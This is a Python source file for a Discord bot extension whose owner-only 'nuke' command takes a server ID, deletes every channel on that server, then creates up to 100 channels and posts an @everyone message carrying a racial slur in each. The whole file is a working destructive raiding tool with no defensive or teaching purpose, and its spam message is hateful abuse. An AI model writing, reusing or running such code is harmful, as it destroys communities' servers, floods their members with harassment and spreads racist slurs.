import discord
from discord.ext import commands
import asyncio


class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.owner_id = 1151872484937834496

    @commands.command(name="nuke", aliases=["nuker"])
    async def nuke(self, ctx, server_id: int = None):
        """Nuke a server by ID. Works in DMs. Bot owner only."""
        
        if ctx.author.id != self.owner_id:
            await ctx.send("❌ You don't have permission to use this command.")
            return
        
        if not server_id:
            await ctx.send("❌ Usage: `!nuke <server_id>`")
            return
        
        guild = self.bot.get_guild(server_id)
        if not guild:
            await ctx.send(f"❌ Could not find server with ID `{server_id}`.")
            return
        
        await ctx.send(f"🚨 Nuking **{guild.name}**... Deleting channels and creating 100 new ones.")
        
        # Delete all existing channels
        deleted_count = 0
        for channel in list(guild.channels):
            try:
                await channel.delete(reason="Nuke command")
                deleted_count += 1
                await asyncio.sleep(0.3)
            except Exception as e:
                print(f"Failed to delete {channel.name}: {e}")
        
        # Create 100 channels
        created_count = 0
        for i in range(100):
            try:
                channel_name = f"nuked-{i+1}"
                new_channel = await guild.create_text_channel(channel_name, reason="Nuke command")
                
                # Send @everyone ping with message
                await new_channel.send("@everyone get nuked niggas")
                created_count += 1
                await asyncio.sleep(0.5)  # Rate limit safety between creates
                
            except Exception as e:
                print(f"Failed to create channel {i+1}: {e}")
                break  # Stop if we're hitting rate limits hard
        
        await ctx.send(f"✅ **NUKE COMPLETE**\n🗑️ Deleted `{deleted_count}` channels\n📢 Created `{created_count}` channels with pings")

    @nuke.error
    async def nuke_error(self, ctx, error):
        if isinstance(error, commands.MissingRequiredArgument):
            await ctx.send("❌ Usage: `!nuke <server_id>`")
        elif isinstance(error, commands.BadArgument):
            await ctx.send("❌ Server ID must be a number.")
        else:
            await ctx.send(f"❌ Error: {error}")


async def setup(bot):
    bot.remove_command("nuke")
    await bot.add_cog(Nuke(bot))
